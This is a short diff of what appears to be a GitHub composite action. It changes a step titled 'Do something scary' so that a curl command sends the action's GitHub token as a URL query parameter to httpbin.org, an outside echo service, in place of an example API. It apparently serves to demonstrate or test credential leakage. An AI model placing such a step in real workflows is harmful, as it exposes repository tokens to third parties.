@@ -11,4 +11,4 @@ runs:
     - name: Do something scary
       id: do-something
       shell: bash
-      run: curl -v "https://api.example.com/data?token=${{ inputs.github-token }}"
+      run: curl -v "https://httpbin.org/get?token=${{ inputs.github-token }}"
